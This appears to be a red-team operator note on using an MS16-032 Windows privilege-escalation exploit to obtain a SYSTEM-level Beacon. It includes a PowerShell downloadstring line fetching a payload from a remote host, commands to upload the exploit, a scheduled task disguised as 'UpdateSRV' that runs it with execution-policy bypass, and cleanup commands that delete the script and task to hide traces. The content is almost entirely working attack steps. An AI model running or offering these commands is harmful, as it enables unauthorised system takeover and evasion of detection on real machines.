## Updated Exploit ms16-032 to get a Beacon back

You need a unpriviledged Shell/Beacon on the target. Don't forget to change the exploit for your correct ListenerName 
```
... downloadstring('http://172.16.0.5:80/a')) ...
```
## Get a Beacon with System Priviledges
```
beacon> cd C:\Windows\Temp
beacon> upload /root/tools/files/ms16-032_beacon.ps1

Now create a schtasks to run your exploit:
beacon> shell schtasks /Create /TN UpdateSRV /SC once /ST 10:10 /TR "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -exec bypass C:\Windows\Temp\ms16-032_beacon.ps1"
System beacon calls back :)

Delete Beacon:
beacon> shell del C:\Windows\Temp\ms16-032_beacon.ps1
Delete Task:
beacon> shell schtasks /Delete /TN UpdateSRV /F
[*] Tasked beacon to run: schtasks /Delete /TN UpdateSRV /F
SUCCESS: The scheduled task "UpdateSRV" was successfully deleted.
```
